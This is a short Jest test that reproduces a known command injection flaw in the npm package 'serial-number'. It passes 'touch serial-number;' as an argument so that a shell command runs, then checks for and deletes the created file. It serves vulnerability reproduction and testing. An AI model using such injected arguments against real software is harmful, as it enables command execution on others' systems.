//https://snyk.io/vuln/SNYK-JS-SERIALNUMBER-559010
test("Command Injection in serial-number", () => 
{
	const root = require("serial-number");
	const fs = require('fs');
	const path = './serial-number';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	root(function(){},"touch serial-number;");
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});